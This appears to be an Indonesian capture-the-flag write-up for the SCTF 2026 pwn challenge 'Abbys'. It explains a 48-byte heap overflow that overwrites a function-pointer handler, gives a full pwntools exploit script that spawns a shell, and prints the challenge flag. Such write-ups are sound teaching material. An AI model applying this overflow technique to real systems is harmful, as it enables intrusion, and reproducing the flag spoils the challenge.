---
slug: "pwn-abbys"
title: "Abbys"
competition: "SCTF 2026"
category: "Pwn"
difficulty: "Medium"
date: "2026-07-04"
updated: "2026-07-06"
summary: "Deskripsi: Sebuah sinyal aneh terdeteksi dari stasiun penelitian bawah laut 'Abbys'. Tim ekspedisi sebelumnya menghilang tanpa jejak, meninggalkan sebuah antarmuka usang yang masih terus menyala dan memancarkan data. Mampukah kamu menyelami kedalaman kode ini dan merebut akses sistem sebelum tekanan air menghancurkan segalanya?\\n\\nnc 103.127.98.249 5001"
tags: ["PWN","MEDIUM","STACK & HEAP"]
status: "published"
flag: "SCTF26{duh_puh_pwn_st4ck_d1tambah_h3ap_1ni_m4h_b4hl1l_jug4_b1ngng}"
attachments: [{"url":"/assets/uploads/d591f01b-d4aa-4e2e-8a57-48f894fe2970-abbys","name":"abbys","contentType":"application/octet-stream"}]
source: "https://claritys.web.id/writeups/pwn-abbys"
---

# Abbys

> Deskripsi: Sebuah sinyal aneh terdeteksi dari stasiun penelitian bawah laut 'Abbys'. Tim ekspedisi sebelumnya menghilang tanpa jejak, meninggalkan sebuah antarmuka usang yang masih terus menyala dan memancarkan data. Mampukah kamu menyelami kedalaman kode ini dan merebut akses sistem sebelum tekanan air menghancurkan segalanya?\n\nnc 103.127.98.249 5001

Link AI:

[https://chatgpt.com/share/6a4862b0-3a08-83ec-a0e2-3088fe0e3121](https://chatgpt.com/share/6a4862b0-3a08-83ec-a0e2-3088fe0e3121)

Pertama cek proteksi:

```bash
~/ctf/sctf
❯ checksec ./abbys
[*] '/home/claritys/ctf/sctf/abbys'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Dari sini beberapa asumsi awal:

-   PIE mati, berarti address fungsi di binary fix. Kalau ada win function atau hidden function, bisa langsung dipakai tanpa leak.
    

-   NX nyala, jadi shellcode di stack/heap bukan jalan paling enak.
    

-   Canary tidak ada, tapi belum tentu bug-nya stack overflow.
    

-   Partial RELRO bikin GOT overwrite mungkin bisa, tapi jangan langsung maksa ke sana kalau ada primitive lebih simpel.
    

Pas lihat decompile, ada tiga menu utama:

```
1. Allocate Object
2. Edit Object
3. Execute Object
```

Object-nya kurang lebih bentuknya begini:

```
struct obj {
    void (*handler)(); // offset 0
    char *data;        // offset 8
    int size;          // offset 16
    int active;        // offset 20
};
```

Waktu allocate, handler default-nya diisi ke fungsi biasa:

```
*(_QWORD *)qword_4040C0[idx] = sub_4012C2;
```

Terus waktu execute:

```
return (*(__int64 (**)(void))qword_4040C0[idx])();
```

Nah ini langsung menarik. Kalau kita bisa overwrite `handler`, kita bisa control RIP secara rapi.

Ada fungsi di `0x4011d6` yang kelihatan kayak win/gate:

```
int sub_4011D6()
{
  if (!dword_404110)
  {
    puts("[-] The gate is locked. You must traverse the abyss first.");
    exit(1);
  }

  puts("[!] Gate opened. Welcome to the other side.");
  ...
  printf("[+] FLAG: %s\n", s);
  return system("/bin/sh");
}
```

Asumsi awal: ini target akhir. Alasannya jelas, dia baca `flag.txt` dan panggil `/bin/sh`.

Tapi ada guard:

```
if (!dword_404110) exit(1);
```

Berarti tidak bisa langsung lompat ke `0x4011d6`, kecuali global `dword_404110` sudah diset.

Lalu ada fungsi lain di `0x4012d8`:

```
int sub_4012D8()
{
  dword_404110 = 1;
  puts("\n[!] ENTERING THE ABYSS [!]");
  ...
}
```

Ini keliatan kayak fungsi unlock. Jadi asumsi berikutnya:

1.  Panggil `0x4012d8` dulu buat set `dword_404110 = 1`.
    

2.  Baru panggil `0x4011d6` buat buka gate dan spawn shell.
    

Asumsi ini cukup kuat karena flow-nya literal banget: gate bilang harus traverse abyss dulu, abyss function ngeset global gate.

Di allocate:

```
qword_4040C0[idx] = malloc(0x18);
...
*(_QWORD *)(obj + 8) = malloc(size);
read(0, obj->data, size);
```

Size boleh `0` sampai `512`.

Di edit:

```
read(0, obj->data, obj->size + 48);
```

Ini bug-nya. Allocate data cuma `size`, tapi edit baca `size + 48`. Jadi selalu ada overflow 48 byte.

Awalnya aku mikir:

-   Kalau allocate object size `0`, `malloc(0)` tetap ngasih pointer valid.
    

-   Edit object itu akan baca `0 + 48 = 48` byte.
    

-   Kalau heap layout object berurutan, overflow dari `obj0->data` bisa nabrak `obj1->handler`.
    

Kenapa asumsi heap layout ini masuk akal? (semoga) Karena program allocate berurutan:

```
obj0 struct
obj0 data
obj1 struct
obj1 data
```

Semua allocation kecil, tidak ada free, jadi allocator cenderung naruh chunk berdekatan. Nah, sekarang tinggal tanya ChatGPT buat bantu refine pemikiranku. Kalau bener ya berarti alhamdulillah, kalau enggak ya debugging lagi 😂.

Nah, ternyata benar. Alhasil aku tinggal nyuruh dia bikin script dan jadi deh:

```python
from pwn import *

elf = context.binary = ELF("./abbys", checksec=False)
context.log_level = "info"

WIN = 0x4011d6
UNLOCK = 0x4012d8
OFFSET = 0x20

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 1337)

def start():
    if args.LOCAL:
        return process("./abbys")
    return remote(HOST, PORT)

p = start()

def alloc(idx, size, data=b"A"):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"Index (0-9): ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data.ljust(size, b"A"))

def edit(idx, data):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b"Index (0-9): ", str(idx).encode())
    p.sendafter(b"Data: ", data)

def execute(idx):
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b"Index (0-9): ", str(idx).encode())

def overwrite_obj1_handler(addr):
    payload = flat(
        b"A" * OFFSET,
        p64(addr),
        p64(0),
        p32(0x18),
        p32(1),
    )
    edit(0, payload)

alloc(0, 0x18, b"A" * 0x18)
alloc(1, 0x18, b"B" * 0x18)

overwrite_obj1_handler(UNLOCK)
execute(1)

p.sendlineafter(b"Size of payload: ", b"0")

overwrite_obj1_handler(WIN)
execute(1)

p.interactive()
```

![](/assets/uploads/e486f7a6-fe5e-4030-a33c-d7cd2c344ea6-image-22.png)
